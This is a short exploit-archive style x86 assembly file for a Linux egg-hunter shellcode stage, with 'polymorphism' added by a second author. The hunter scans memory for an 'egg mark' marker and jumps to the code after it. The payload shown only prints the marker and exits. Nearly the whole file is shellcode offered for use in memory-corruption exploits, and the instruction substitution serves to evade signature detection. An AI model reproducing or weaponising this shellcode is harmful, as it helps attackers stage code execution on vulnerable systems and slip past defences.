
;Exploit Title: Linux/x86 egghunt shellcode 
;Date: 23-07-2011
;Original Author: Ali Raheem
;Little bit of polymorphism applied by tripster
section .data
    msg     db "We found the egg!",0ah,0dh
        msg_len equ $-msg
        egg     equ "egg "
        egg1    equ "mark"
section .text
    global  _start
_start:
        jmp     _return
_continue:
    pop     eax             ;This can point anywhere valid
_next:
        inc     eax     ;change to dec if you want to search backwards
_isEgg:	
	mov 	edx,egg
        cmp     dword [eax-8],edx
        jne     _next
	mov 	ebx,egg1
        cmp     dword [eax-4],ebx
        jne     _next
        jmp     eax
_return:
        call    _continue
_egg:
        db  "egg mark"              ;QWORD egg marker
        sub     eax,4
	sub 	eax,4
        mov     ecx,eax
        mov     eax,2
	add 	eax,2
	xor 	edx,edx
	mov 	edx,5
	add 	edx,3
        mov     ebx,1
        int     80h
        mov     ebx,5
	push 	ebx
	pop 	eax
	sub 	eax,4
        xor     ebx,ebx
        int     80h
